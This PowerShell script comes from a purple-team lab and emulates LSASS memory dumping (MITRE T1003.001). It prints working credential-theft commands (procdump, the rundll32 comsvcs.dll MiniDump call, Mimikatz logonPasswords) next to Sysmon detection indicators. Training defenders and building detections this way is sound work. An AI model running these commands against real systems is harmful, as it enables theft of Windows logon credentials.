<#
.SYNOPSIS
    LSASS Memory Dumping (MITRE ATT&CK: T1003.001)

.DESCRIPTION
    Dumps LSASS process memory to extract credentials

.NOTES
    Author: Purple Team Lab
    MITRE ATT&CK: T1003.001 - OS Credential Dumping: LSASS Memory
    Date: 2024-01-14

    Detection: Event ID 10 (Sysmon ProcessAccess targeting lsass.exe)

.EXAMPLE
    .\lsass_dump.ps1 -OutputPath C:\Temp\lsass.dmp
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "$env:TEMP\lsass.dmp"
)

Write-Host "===== LSASS MEMORY DUMP ATTACK ====="
Write-Host "MITRE ATT&CK: T1003.001`n"

# Get LSASS PID
$lsassPID = (Get-Process lsass).Id
Write-Host "[*] LSASS Process ID: $lsassPID"

Write-Host "`n[*] Dumping Methods:"

# Method 1: Task Manager (built-in)
Write-Host "`n1. Task Manager: Right-click lsass.exe -> Create dump file"

# Method 2: Procdump
Write-Host "`n2. Procdump (Sysinternals):"
Write-Host "   procdump.exe -ma $lsassPID $OutputPath"

# Method 3: Mimikatz
Write-Host "`n3. Mimikatz:"
Write-Host "   sekurlsa::minidump $OutputPath"
Write-Host "   sekurlsa::logonPasswords"

# Method 4: Comsvcs.dll
Write-Host "`n4. Comsvcs.dll (Living off the Land):"
Write-Host "   rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $OutputPath full"

Write-Host "`n[!] DETECTION INDICATORS:"
Write-Host "  - Sysmon Event ID 10 (ProcessAccess)"
Write-Host "  - Target: lsass.exe"
Write-Host "  - GrantedAccess: 0x1010 or 0x1410"
Write-Host "  - Suspicious source processes"

Write-Host "`n[+] Offline parsing with Mimikatz:"
Write-Host "   sekurlsa::minidump $OutputPath"
Write-Host "   sekurlsa::logonPasswords"
